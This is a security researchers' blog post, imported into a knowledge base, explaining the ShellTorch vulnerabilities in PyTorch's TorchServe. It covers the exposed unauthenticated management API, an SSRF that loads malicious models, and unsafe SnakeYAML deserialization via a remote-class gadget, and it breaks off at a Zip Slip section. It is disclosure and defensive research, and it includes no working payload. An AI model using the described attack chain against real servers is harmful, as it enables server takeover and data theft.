---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-08_shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server-torchserve.md
original_filename: 2024-07-08_shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server-torchserve.md
title: 'Shelltorch Explained: Multiple Vulnerabilities in Pytorch Model Server (Torchserve)
  (CVSS 9.9, CVSS 9.8) Walkthrough'
category: documents
detected_topics:
- supply-chain
- ssrf
- path-traversal
- cloud-security
- command-injection
- jwt
tags:
- imported
- documents
- supply-chain
- ssrf
- path-traversal
- cloud-security
- command-injection
- jwt
language: en
raw_sha256: 27eec9165e268188ae8ce2db2b1cbbc67f5ca6c600f20056f9527572f0d05382
text_sha256: 9810630ca061cd6e16f06a9374eefa95dca176191b1db9f16e1df8a0118ec613
ingested_at: '2026-06-28T07:32:35Z'
sensitivity: unknown
redactions_applied: false
---

# Shelltorch Explained: Multiple Vulnerabilities in Pytorch Model Server (Torchserve) (CVSS 9.9, CVSS 9.8) Walkthrough

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-08_shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server-torchserve.md
- Source Type: markdown
- Detected Topics: supply-chain, ssrf, path-traversal, cloud-security, command-injection, jwt
- Ingested At: 2026-06-28T07:32:35Z
- Redactions Applied: False
- Raw SHA256: `27eec9165e268188ae8ce2db2b1cbbc67f5ca6c600f20056f9527572f0d05382`
- Text SHA256: `9810630ca061cd6e16f06a9374eefa95dca176191b1db9f16e1df8a0118ec613`


## Content

---
title: "Shelltorch Explained: Multiple Vulnerabilities in Pytorch Model Server (Torchserve) (CVSS 9.9, CVSS 9.8) Walkthrough"
url: "https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server"
final_url: "https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server"
authors: ["Gal Elbaz", "Uri Katz", "Guy Kaplan", "Avi Lumelsky"]
programs: ["PyTorch", "AWS", "Google", "Meta TorchServe", "SnakeYAML"]
bugs: ["AI", "LLM", "RCE", "SSRF", "Insecure deserialization", "Zip Slip attack", "Path traversal"]
publication_date: "2024-07-08"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 183
---

[![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a0b283acc44242f97968305_Oligo%20-%20Full%20Logo%20-%20Color.svg)](/)

  * Platform

[Overview](/runtime-platform/overview)[Runtime protection](/runtime-platform/cloud-application-detection-and-response)[Runtime posture](/runtime-platform/runtime-vulnerability-management)[Runtime AI security](/runtime-platform/runtime-ai)

[![From Prompt to Syscall: AI Detection & Response Across the Full Execution Chain](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/6a2aed7e54378643e72fa189_oligo_webinar_from_prompt_to_syscall.png)From Prompt to Syscall: AI Detection & Response Across the Full Execution ChainSign up](https://oligosecurity.registration.goldcast.io/webinar/be7e0237-2ba0-4f33-bc63-4620a7ba5997)

  * Solutions

Who it's for

[Security leaders](/solutions/security-leadership)[SecOps pros](/solutions/security-operations)[AppSec pros](/solutions/application-security)[CloudSec pros](/solutions/cloud-security)

Use cases

[Runtime exploit blocking](/solutions/exploit-blocking)[Real-time bom/vex](/solutions/real-time-bom)[Application vulnerability management](/solutions/application-vulnerability-management)[AI security](/solutions/ai-security-management)

[Workload protection](/solutions/workload-protection)[Compliance and assurance](/solutions/compliance-and-assurance)[Attack detection and response](/solutions/detection-and-response)[Supply chain security](/solutions/supply-chain-security)

  * Customers

[All case studies](/resources/case-studies)[Cato Networks](/case-study/cato-networks)[Leading Crypto Exchange](/case-study/cryptocurrency-exchange)[Mural](/case-study/mural)[One Trust](https://www.oligo.security/case-study/onetrust-case-study)

[Cresta](/case-study/cresta-case-study)[Major FinServ Company](/case-study/financial-services-organization-secures-money-management-platform-with-oligo)[Nasdaq Traded Company](https://www.oligo.security/case-study/nasdaq-traded-company-uses-oligo-to-implement-a-maximum-value-minimum-effort-security)[Openweb](/openweb-case-study)

[![Navigating Open Source Vulnerabilities: A Guide to Risk Prioritization](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69f21ff33128dac7df537613_Navigating%20Open%20Source%20Vulnerabilities.jpg)Navigating Open Source Vulnerabilities: A Guide to Risk PrioritizationRead more](https://www.oligo.security/ebook---navigating-open-source-vulnerabilities--a-guide-to-risk-prioritization)

  * Resources

[Resource hub](/resource-hub)[Blog](/resources/blog)[Runtime academy](/academy)[Events](/resources/events)[Webinars](/resources/webinars-and-videos)[Threat research](/resources/blog?category=Research)[App attack matrix](https://app-attack-matrix.com/)

[![From Prompt to Syscall: AI Detection & Response Across the Full Execution Chain](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/6a2aed7e54378643e72fa189_oligo_webinar_from_prompt_to_syscall.png)From Prompt to Syscall: AI Detection & Response Across the Full Execution ChainSign up](https://oligosecurity.registration.goldcast.io/webinar/be7e0237-2ba0-4f33-bc63-4620a7ba5997)

  * Company

[About Us](/company/about)[Why Oligo](/company/why-oligo)[Newsroom](/resources/news)[Partners](/company/partners)[Careers](/company/careers)[Contact Us](/contact-us)

[![Navigating Open Source Vulnerabilities: A Guide to Risk Prioritization](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69f21ff33128dac7df537613_Navigating%20Open%20Source%20Vulnerabilities.jpg)Navigating Open Source Vulnerabilities: A Guide to Risk PrioritizationRead more](https://www.oligo.security/ebook---navigating-open-source-vulnerabilities--a-guide-to-risk-prioritization)

[BOOK A DEMO![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a0b2c3500914584e7983a6e_CTA%20icon.svg)](/demo)

1

min read

# Shelltorch Explained: Multiple Vulnerabilities in Pytorch Model Server (Torchserve) (CVSS 9.9, CVSS 9.8) Walkthrough

Date:

Jul 8, 2024

Category: 

Research

Shadow Vulnerability

Author:

Uri Katz

Avi Lumelsky

Guy Kaplan

Page top

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69edde6eccc36d544f504d92_Shelltorch%20Explained.webp)

Want the deep dive, full story with technical walkthrough for the PyTorch (TorchServe) ShellTorch vulnerabilities **CVE-2023-43654** (CVSS: 9.8) and **CVE-2022-1471**(CVSS: 9.9)? You’re in the right place. First discovered and disclosed by the Oligo Research Team, the ShellTorch vulnerabilities enabled researchers to gain complete, unrestricted access to thousands of exposed TorchServe instances used by the biggest organizations in the world.

  * ‍Motivation and The Story Behind ShellTorch‍
  * What is TorchServe?‍
  * Deep Dive into ShellTorch Vulnerabilities‍
  * Bug #1 - Abusing the Management Console‍
  * Bug #2 - SSRF leads to RCE (CVE-2023-43654) (NVD, CVSS 9.8)‍
  * Bug #3 - Java Deserialization RCE - CVE-2022-1471 (GHSA, CVSS: 9.9)‍
  * Bug #4 - Zipslip - (CWE-23) Archive Relative Path Traversal‍
  * Demo‍
  * Who is affected?‍
  * Malicious Models: New Threat Could Poison the Well of AI‍
  * Key Takeaways‍
  * References

## In Brief

In July 2023, the Oligo Research Team disclosed multiple new critical vulnerabilities to Pytorch maintainers Amazon and Meta, including **`CVE-2023-43654`** (CVSS 9.8). These vulnerabilities, collectively called ShellTorch, lead to Remote Code Execution (RCE) in PyTorch TorchServe—ultimately allowing attackers to gain complete, unauthorized access to the server.

Using this access, attackers could insert malicious AI models or even execute a full server takeover.

Oligo Research identified thousands of vulnerable TorchServe-based instances that were publicly exposed in the wild. Those applications were not only vulnerable, but unknowingly publicly exposed to the world—putting them at direct risk.

Some of the world’s largest companies, including members of the Fortune 500, had exposed TorchServe-based instances. The vulnerability immediately became low-hanging fruit for attackers—including an example exploit added to Metasploit's offensive security framework shortly after the disclosure.

Exploiting ShellTorch starts by abusing an API misconfiguration vulnerability (present in the default configuration) that allows remote access to the TorchServe management console with no authentication of any kind. Then, using a remote Server-Side Request Forgery (SSRF) vulnerability, the attacker can trick the server into downloading a malicious model that results in arbitrary code execution.

The result: a devastating attack that allows total takeover of the victim’s servers, exfiltration of sensitive data, and malicious alteration of AI models.

In this post, we take a deep, step-by-step dive into the ShellTorch vulnerabilities—how they work, how they were discovered, and how Oligo researchers found thousands of publicly exposed instances at the world’s largest organizations. We’ll also touch on the implications of these discoveries for new risks introduced by the combination of AI model infrastructure and OSS in a new age of AI. 

## Motivation: AI + OSS = Big Opportunities (and Big Vulnerabilities)

AI reached new heights of visibility and importance starting in 2023. Buzz-generating, consumer-friendly LLMs led the pack.  
The most powerful governments and businesses in the world have taken notice: this year, the White House began to [regulate](https://www.whitehouse.gov/briefing-room/statements-releases/2023/07/21/fact-sheet-biden-harris-administration-secures-voluntary-commitments-from-leading-artificial-intelligence-companies-to-manage-the-risks-posed-by-ai/) the use of AI, publishing an executive order requiring organizations to secure their AI infrastructure and applications.  
Open-source software (OSS) has underpinned AI from the start. Using OSS accelerates development and innovation, but with a potential security cost: when attackers uncover exploitable vulnerabilities in a widely used OSS package, they can attack many applications and organizations that depend on that package.  
Government regulators, seeing the massive potential for cyber loss, have set their sights on keeping open-source software secure.  
When the Oligo Research team wanted to put this brave new world of AI frameworks and applications built on OSS to the test, one clear target emerged: PyTorch.  
Our research started with a simple question: **could PyTorch – the most popular, well-researched AI framework in the world – be used to execute a new kind of attack?** ‍

It’s a vital question, because PyTorch—with over 200 million downloads for its base package (more than 450k times in a single day) and over 74,400 stars in GitHub by the end of 2023—is the top choice for AI and ML researchers today.  
Of course, our researchers weren’t the first people to think of going after PyTorch. One of the world’s most-used machine learning frameworks, PyTorch presents an attractive target … and attackers have definitely noticed.  
In 2022, attackers leveraged dependency confusion (also called repository hijacking) to [compromise](https://pytorch.org/blog/compromised-nightly-dependency/) a PyTorch package, infecting approximately 1.5 million users who downloaded it with the malicious package directly from PyPi.

## The Story Behind ShellTorch

To understand the full impact and exploitation details of ShellTorch, it’s important to discuss a few of the underpinnings of the vulnerabilities themselves, which stem from three main concepts:

  1. How AI models are typically trained and deployed
  2. The specific package impacted (**TorchServe**)
  3. How TorchServe is built and used.

## How AI models are typically trained and deployed 

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814c9e_66d05d5e559bf39f17e192ce_6620ca5379571edc9e976452_afceTvf2oIRa4ShIuj6pxjACJILaqSa4qp5Xl1hlE6W3omhnal1SeFeEcoIIr3vzO97Eo1EFb5V00kmMx61suM9NibrPrz7DL2jTIaZX8YxTPku6RoJR9BfP3CsXs2ZlEqsYpbVcixNLR-KFOVtCZ0g.avif)

 _AI Model Development Lifecycle_

ShellTorch depends on model serving, so let’s start with a look at how models are served (deployed) in production.  
To leverage a model in production, We need a capability that is called “Inference, “ to make predictions about new data. In simple words, the model is a function, F(x) = y.

We want to predict y based on x, and F is our model. This function (“inference”) is done in a loop, usually on an optimized execution graph using CUDA or graph compilers, typically inside an inference server running on dedicated hardware accelerators such as GPUs (Nvidia, AMD, Intel, Qualcomm), TPUs (Google) or special CPUs (Amazon, Intel). Each hardware type has unique advantages, but today, most inference servers use GPU. Without inference servers, it would be impossible to scale GPUs to optimize hardware.

While there are several deployment options available (embedding the model within the application, on-premises deployment, etc.) the most common way to integrate model serving is as a separate service (or microservice) that implements a lightning-fast, stable API for managing and interacting with the loaded models.

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c78_66d05d5d559bf39f17e19293_6620caa003d8f98f2ed2fb0c_MTgRePtIzLBBmv-TENc_ETdCUYhKId3zx1zd3bOflH4C8TvLoBYOgqiPwh8iLXYWAe-oVLKdEefkgLGhV--UAUndLPbuAyawm40el5ZtiU8yXLofslpjmaSrrPhwN3A4et9YM-HIsR2WNCIwB7c_wUQ.avif)

How AI models are used in production

### What is TorchServe?

TorchServe is an open-source model-serving library developed primarily for deploying PyTorch models in production. Part of the PyTorch ecosystem, TorchServe is integral to serving, optimizing, and scaling PyTorch models in production. 

TorchServe’s significance is reflected in its GitHub repository—which shows **3.8k** stars, more than **1M** pulls via DockerHub, and **47K** downloads via PyPI per month—and in its use at organizations (including Google, Amazon, Intel, Microsoft, Tesla, and Walmart) and widely adopted projects (including [AWS Neuron](https://awsdocs-neuron.readthedocs-hosted.com/en/latest/frameworks/torch/torch-neuron/tutorials/tutorial-torchserve.html), [Kserve](https://kserve.github.io/website/0.8/modelserving/v1beta1/torchserve/), [MLflow](https://github.com/mlflow/mlflow-torchserve), [AnimatedDrawings](https://github.com/facebookresearch/AnimatedDrawings), [vertex-ai-samples](https://github.com/GoogleCloudPlatform/vertex-ai-samples), [mmdetection](https://mmdetection.readthedocs.io/en/v2.19.1/useful_tools.html#convert-model-from-mmdetection-to-torchserve), and [Kubeflow](https://mmdetection.readthedocs.io/en/v2.19.1/useful_tools.html#convert-model-from-mmdetection-to-torchserve)).

Some companies even provide cloud-based solutions based on TorchServe, including frameworks like GCP Vertex.Ai and AWS Sagemaker.

TorchServe’s adoption by leading tech companies and projects highlights its reliability and effectiveness in handling AI infrastructure​. Its level of activity indicates a growing interest in the tool within the machine learning and AI development communities​​.

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814ca1_66d05d5e559bf39f17e192d3_6620cadb8afa4722113368f7_KuWkqvjrGoPq-nwVjQe_OR59PyCOj8rQKTPoP7g3f8EP7EaVqDB_TtFmsI-Rn__JgZgUnCxDzikRIiGskB5loLPwppHNrBwWsXCSECPWdyhC0LyJa5RRaODQ8qbdh5lwgHghZRnCFnenH5ign3hT91c.avif)

PyTorch TorchServe has been successfully integrated into the most reputated products in the industry.

Widely used and highly significant to AI model deployment in production environments, TorchServe is an obvious, attractive point of interest for attackers seeking to exploit AI infrastructure vulnerabilities.

### **How TorchServe Works: Interfaces** ‍

TorchServe is Java-based and implements a RESTful API for model serving and management in production, supporting three different interfaces: Inference, Metric, and Management. 

  * **Inference API used to get predictions from the server - Port 8080**  
• /Ping : Gets the health status of the running server  
• Predictions : Gets predictions from the served model  
• /StreamPredictions : Gets server-side streaming predictions from the
  * **Management API - allows management of models at runtime - Port 8081  
** • /RegisterModel : Serve a model/model version on TorchServe  
• /UnregisterModel : Free up system resources by unregistering a specific model version from TorchServe  
• /ScaleWorker : Dynamically adjust the number of workers for any version of a model to better serve different inference request loads.  
• /ListModels : Query default versions of current registered models  
• /DescribeModel : Get detailed runtime status of default version of a model  
• /SetDefault : Set any registered version of a model as default version
  * **Metrics**[**API**](https://github.com/pytorch/serve/blob/master/frontend/server/src/main/resources/proto/management.proto)**\- uses to get metric about - Port 8082  
** • /Metrics : Get system information metrics

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814ccc_66d05d5e559bf39f17e1930f_6620cba68ade7b335b88cdec_VZBPfPQzqUGcLVQ0ZJpf2FatQsvuB2i7Yc7D0cBkp25DxF-xSv7WU6bDkHmK0i_0NrQ6R9KAgl970PTvWsdkIa-rlJ5eJlajpZcVoaQKfPejRsQHic8CpSsI9FgpWFsQwcRDS6M9ui5MDpXBW9n527M.avif)

 _The Architecture of TorchServe_

TorchServe supports serving multiple models, each model managed by a dynamically assigned worker process. Each model is described by a Model Archive File (.mar) and handler file.  
The** _`handler.py`_** file is used to define the custom inference logic for deployed models. When an incoming request is made to a TorchServe deployment, this handler module is responsible for processing the request, performing inference using the loaded model, and returning the appropriate response.

TorchServe also supports workflows, a feature allowing you to chain multiple models or pre- and post-processing steps together in a defined sequence. This is particularly useful when you have a complex inference task that requires the output of one model to be the input of another.

Workflows made it easier to efficiently deploy and manage PyTorch models for production use cases by streamlining the process of preparing your model, packaging it into an archive, deploying it with TorchServe, handling incoming inference requests using the defined **handler.py** , and generating responses for clients. It uses workflow archive format (**.war**) comprising several files, including YAML files that manage configuration.  
To generate a workflow file, you can use the torch-workflow-archiver:

`torch-workflow-archiver --workflow-name my_workflow --spec-file vulnerable_conf.yaml --handler handler.py`

So TorchServe exposes an API that propagates requests to our Python handler. The handler is archived into a portable file, which is used to load the model.  
What could possibly go wrong?

# ShellTorch Vulnerabilities

### ‍**Bug #1 - Abusing the Management Console:** Unauthenticated Management Interface API Misconfiguration

We started by spinning our servers up, following the step-by-step guide on the official TorchServe documentation with the default configuration using one of the __[_samples_](https://github.com/pytorch/serve/tree/master/kubernetes/EKS) __ attached to the official TorchServe repository. We ended up with an active instance of TorchServe.

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c7e_66d05d5d559bf39f17e19299_6620ccb0f63177719d73d97b_YYTwvutpaU5kt1xzn16R2TkG5e6Xg3cNI4a-dOUg-cCd4708DxX2YCP1KX8Zl3n39QEY1j4c869v4Y17nkFW409HSjCTiVdr5BKuYcp4jDA27HqpdfmFp4A8HUugOUgPdxdowmwbcyWRC0g-rZEZIEA.avif)

We immediately saw that by default, TorchServe exposes all three ports publicly on all interfaces, including the management interface.

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c75_66d05d5d559bf39f17e19290_6620cd59181fa4039b5422d7_9BIOazEqYgKTP78U_C41EXrsGUzPqj6qDhvm5gx3uOQu6x2stkhFssHH6-VFiM1oP5WqIRLpkbsxLQYXHJ15X_r9SALUYSuQybApvIUuvfiVTHDKWZlnPvai__yUYYRqb6XO9-wVXUQtXXVy3sa_x6M.avif)

_The output of TorchServe pod - clarified that the server binds on 0.0.0.0_

But wait, hold your horses. The official TorchServe documentation claims that the default management API can be accessed only from localhost by default:

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c72_66d05d5d559bf39f17e1929f_6620cd666dd3631b70cf02a5_uWIfSyDZern0eVXpDVOawNKz0iH_nN68eM7Ju5EMYbAAgHtofVPExDJX252hkvpfttS7aPbtriqO6lQCx-LZUKbffPEJknZgy2e-8iCLZ7Xb3pk5J8eJMvL7ei9q3WEF9es4-L8qS3qvJahWano-910.avif)

_A screenshot taken from_[ _PyTorch’s official documentation_](https://pytorch.org/serve/rest_api.html#:~:text=By%20default%2C%20TorchServe%20listens%20on,remote%20host%2C%20see%20TorchServe%20Configuration)

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814cb3_66d05d5e559bf39f17e192ff_6620cd77ec871b9ed546cbc7_QqbqWnp35ex1CGOxscy6khn0f04PXoMdk4UecxH4r8N9hK-mXyLO2AY1Zy3hC_0jpJo-TzP-A1a8E7aAHZS_QelMSAhnQhoaC_fwAVqY5FrPlj6SyD9qKUclwfDEmopE5TltV5U5IjG0OCD5bhnA3mg.avif)

TorchServe API Documentation claims it is running on 127.0.0.1

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814cc9_66d05d5e559bf39f17e1933b_6620cd8b3aad47f39a583204_f-FY3s2OLEMB6mFPhsb3INerUDj4Jqf9UGuKzeLgW2L-jnmGRN9VeYdUm0RoGD0zZOYxGwCBL0n1ZxJIEo_tiLQbxO-O58bZ_qLRe7xuEoPYZvn8SteSpRt_K4qB_a0oEQcQSCGJUdvry5Ohi-xd_ko.avif)

And that made our hacker spidey senses tingle…

The project’s documentation claims — misleadingly — that the default management API is accessible only from localhost by default. However, in the project configuration files, this interface binds on **_`0.0.0.0`_ ,** as seen in the **_`config.properties`_** file:  

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c6f_66d05d5d559bf39f17e19296_6620cd95f63177719d74e95e_IsYPfI0Ys8_e_JYEJ5M4EHQ3luHA6TrC-J4dcUjX4QF4G3JtGMKW0doN6R443J9eLWmj1FtSU5Opau95WFW7VIeGF0MjAk_TjCGw-bt8XUrC2pFTmzF1xU1Pa_-1skQcrjcfQl6ifN1ue-a7VcJl6Dg.avif)

_Source:_[_https://github.com/pytorch/serve/commit/fd6cf57409cf058abc04935a30e685f16c3b4cf3_](https://github.com/pytorch/serve/commit/fd6cf57409cf058abc04935a30e685f16c3b4cf3)

Because of these documentation issues, users mistakenly believe that the management API is accessible only internally by default. In reality, anyone at all can gain external access. Even the [_`docker`_](https://github.com/pytorch/serve/tree/7e2de2372e9a469a2d21fa5f75e784472339cf17/docker) _`/start.sh`_ script is misleading, and it is hard coded to print 127.0.0.1 with the echo command:  

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814c91_66d05d5d559bf39f17e192ab_6620cfd96dd3631b70d3fd07_WqZZ3Q5osBo8nzxFeOegdUYbOXHrwguERcn48I-z-xw6taMGGmNCSDuNVvoDIRX5zDhiEYTgGz91N__0rSVbFbn3uq_9rmtDgCMzTyOcejk_R34ErPj_h_64iurFXD6KU6a1j92sLmicjayQ_gQjMOw.avif)

Hard coded address: 127.0.0.1:8081

Changing the configuration from the default can fix the misconfiguration, but this configuration mistake appears as the default in the TorchServe installation guide, including in the default TorchServe Docker.  
  
The Docker container also exposes the management interface port:

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c7b_66d05d5d559bf39f17e1928a_6620cfe5b5f5da51254d01f8_8Nv4V9DojOKlsxydyOz6ZoKzPjrhUzrsnnheBTdPqjsc5KqgIi2bzuwBY17bxsLtkFkhJqzFkHByncdqyjIh4nZo53LtZIZH04vy-wZ9z8oC7tEHkI1UFqwcPf009Ce7aWtayG1tVvSbV_wAqQrUjAA.avif)

Default docker run command

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c81_66d05d5d559bf39f17e19287_6620cfeca86505bc90c69ba1_WwwS-Ff_qgHqm8LbmO2uw68NKtvxQMhGGYKGyp4db0w34N_ZsX1x7xXbjYjy_lwguQ_0yUCA4JzyBCH-ZrfHNEJ1aVUmqOxeE5R-Qx5A4KDz7NTpLDZGEeVhBnxw88cHiHDhE2_e2Z5VimmO6tY1BOo.avif)

EXPOSE statements from the dockerfile

We knew this was a serious problem because _by design,_ the management console has powerful capabilities that can expose a whole attack surface. Using an unauthenticated management API lets anyone from anywhere, without any credentials, upload and edit TorchServe configurations. This opens the door to attackers, who can then upload models and workflows—or exfiltrate sensitive data.

### **Bug #2 - Remote Server-Side Request Forgery (SSRF) leads to Remote Code Execution (RCE) CVE-2023-43654 (NVD, CVSS 9.8)** ‍

By default, the management interface allows the registration of new model workflow configurations.

While primarily meant for loading model/workflow (**MAR/WAR**) files from the local “model_store” directory, the management API also allows model/workflow files to be fetched from a remote URL, primarily meant for fetching models from remote S3 buckets.

While it is possible to allow-list domains using the **_`allowed_urls`_** configuration parameter using a list of accepted regex strings. TorchServe fails again to provide a safe default configuration and **allows any URL to be accepted by default.**

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814c9a_66d05d5d559bf39f17e1928d_6620d028dedd8fb9a120e05f_tGsfXscJIzgAHeYv4r9-PjrdAyAOvaSK9sbxNLSNC4gUbxcrUH_3wvbTeOIsA7rnGR98nFdoslw4dIOUzPOf2E7Q3_Wp5HaqPPGjiWcOVxJWs8dQWRwWXRj4U7GOABJIFydJNj1SbS5t6-oKppfsdlw.avif)

_Verify that the link is a valid file path or HTTP URL, without any further restrictions.._

Yes, we were surprised as well.

To make it even more challenging for developers to keep this API secure, the documentation includes this parameter in its “ _Other properties - performance tuning_ ” section, rather than treating it as a “ _security configuration_ ” and listing it with other security configurations in the documentation.  

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814cb6_66d05d5e559bf39f17e19318_6620d02f4034c8e2d4d3adc8_RSAi8eoBirxIdW0h6xiSdOAyQ9D5M-6oQFuK1sd-3y4UFExsSJVjg1JIIRf9FUfxn8IiGRHWVJf8QCc5EIFXGfpM9vboGigbTzcROGppBcj-8tO0ixBET3clFUqv836UzIXpzykOYvnwK0fxTxstNOY.avif)

These features are defined as "Performance Tuning".

Unlike the documentation says, some of the fields are considered security flags - very important ones, such as _allowed_urls._ ‍

Although the documentation ignores the potential security implications of the default setting, it leads to an SSRF vulnerability when registering a workflow archive from a remote URL, because any URL is accepted

This SSRF allows arbitrary file writes to the model store folder, enabling attackers to upload malicious models to be executed by the server.

Now that we know that we can write our model files from our controlled URL address, along and we know that the PyTorch definition of the model is **Python code** , we can use this to exploit the server by (for example) overwriting the _`handler.py`_(Python code) that will be executed by the server, which results in arbitrary code execution.

However, we wanted to explore other ways to exploit the system. We saw that besides the Python code, the model also includes a YAML file: the Workflow specifications are defined in a YAML format. This piqued our interest, as we know that parsing YAML files can be tricky if not handled correctly.

### **Bug #3 Exploiting an insecure use of open source library: Java Deserialization RCE - CVE-2022-1471 (GHSA, CVSS: 9.9)** ‍

Our research team noticed TorchServe uses the widely adopted Java OSS library **_SnakeYaml_** (version 1.31) for parsing the YAML file. As part of a bigger research project on insecure-by-design libraries, we had already learned that SnakeYAML is vulnerable to unsafe deserialization, a vulnerability caused by a misuse of the library when using an unsafe constructor to parse YAML files.

SnakeYaml's **_`Constructor`_ **class, which inherits from **_`SafeConstructor`_** , allows any type to be deserialized given the following line:

_`new Yaml(new Constructor(Class.class)).load(yamlContent);`_ ‍

TorchServe’s API orchestrates PyTorch models and Python functions using Workflow APIs, with RESTful interfaces for workflow management and predictions. Workflow specifications are defined using YAML files that include model details and data flows. The YAML file is split into multiple sections:

  1. Models which include global model parameters
  2. Relevant model parameters that will override the global parameters
  3. A **DAG** (Directed Acyclic Graph) that describes the structure of the workflow (which nodes feed into which other nodes)

We know that TorchServe uses a YAML configuration file for the Workflow specification, so we looked for the parsing functionality triggered while registering a new workflow via the management API. We knew we could control the YAML file input when registering a new workflow to trigger this flow remotely. 

We started examining the TorchServe code to find where the YAML parsing was done. We immediately saw that the Pytorch maintainers made the same mistake, using SnakeYAML in an unsafe way. This made TorchServe vulnerable when it insecurely loads user input data using the default **_`Constructor`_ **instead of **_`SafeConstructor`_ , **as is the recommended procedure when parsing YAML files data from untrusted sources.

We identified three vulnerable functions reachable from multiple flows that can be triggered from remote:**‍**

** _`loadConfigurations`_ **function:

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814c97_66d05d5d559bf39f17e192a5_6620d09dd6a09f31abf06443_5fD-vo-TuAUZ4a3V3R5sGoNYhAw3ddRxExEcWvC-djYc3Xb1_HD0OQKyU0CyQW8ttr1ROoiFOTOk63VqFuW6wOMpHe8oDi7VSEXWsBPJvks49B4EIIv5r_4SI0fX-QpqrJUzhuUecQcin4aSI8VHgJw.avif)

**_`readYamlFile`_ **function:

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814c8e_66d05d5d559bf39f17e1929c_6620d0a30e7bc010815fa9df_bsFcucSAlwihRHpn3BmdY7pHOJjC2ySC9jbYzK9gKzir2lELEa3unk1xSDlq0O5FpAc1tGPjONss1HeR7BDFUs1Jot3aS-bG_5OJOdWS3gc3MCGm01dRQFBuBaKkIZ9spzM82Ib22BjjTh-6X-mixWI.avif)

**_`readSpecFile`_ **function:

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814c94_66d05d5d559bf39f17e192b7_6620d0b11ce586a1a3f906db_emmVF3WbKIis0ytdp1Ce5Qalg2dvY2sXc4OglTViCE68F5roqtlW8SjDjaldMVDmA3dj13qllpXVii2h4IJ_bETxx-BS8qsBfowqXF51Ey8ewD2oIW3ZbkFaEaPmciWh7yJJCvbiy_Un6whE0arJz40.avif)

Upon user input, these functions call to the vulnerable _``_**_`yaml.load`_** function without using the **_`SafeConstructor`_** when constructing the YAML object. This means they are impacted by the SnakeYAML deserialization vulnerability.

In our research, we focused on one specific function: **_`readSpecFile`_**. This function is triggered while registering a new workflow via the management API, using a YAML specification configuration file. 

This file acts as the input to the **_`readSpecFile`_ **function:  

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c79a90dc8506c814c88_66d05d5d559bf39f17e192a8_6620d110263244d81f6a665e_FAJHYLAHqqoI2kc2h7vFQ_aS49zMNLDEF-bJqM47zCtgnigq8ud5jEHtvRJAYHVGUJDUY88Ge_bONVCIiL2Ia45283MwF2qvGsMmRf9A3hSOwvLLzwKm5Gjje49ZJRV010LP8Vjx6VvNGb9X6-E7Idk.png)

We can exploit the SnakeYAML vulnerability by registering a new workflow that will invoke the YAML unsafe deserialization vulnerability to load and run the Java code we have inserted.

Our malicious payload will be met with a vulnerable specification YAML file that uses (for example) the **ScriptEngineManager** gadget, which loads any Java class from a remote URL.

Now, we had proven that AI models can include a malicious YAML file to declare their desired configuration, and by uploading a model with a maliciously crafted YAML file, we can trigger this unsafe deserialization vulnerability, resulting in code execution on the target TorchServe server.

### **Bug #4 - Zipslip - (CWE-23) Archive Relative Path Traversal** ‍

We found a lot of bugs in TorchServe—enough that we wanted to check a couple of additional attack vectors to see exactly how vulnerable this widely relied upon model server really was. 

That’s when we noticed there’d been another slip-up in TorchServe’s security: a [ZipSlip](https://en.wikipedia.org/wiki/Directory_traversal_attack#Zip_Slip_vulnerability) vulnerability that could result in an archive relative path traversal.

We knew that workflow/model registration API model files (MAR/WAR) can be fetched from a remote or local URL. MAR/WAR files are essentially .zip or .tar.gz files that are downloaded and extracted into workflow/model directories.  

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7aa90dc8506c814cb9_66d05d5e559bf39f17e192d6_6620d145dedd8fb9a122249c_AMPetUe83TEv7M0olJ5HzhjP3i7jt8z2s9t3By15t_LxYjCCp23B1Oma0TQRvsQ17UCtqqW_0FQHCyNMx1MCZONUwMy6n3y2hD_GKoaomHw8Nux89iLnxT2BE4x2r3EO90FLWaHyHHXrLZDseOCFkgs.avif)

ZipUtils.java:72

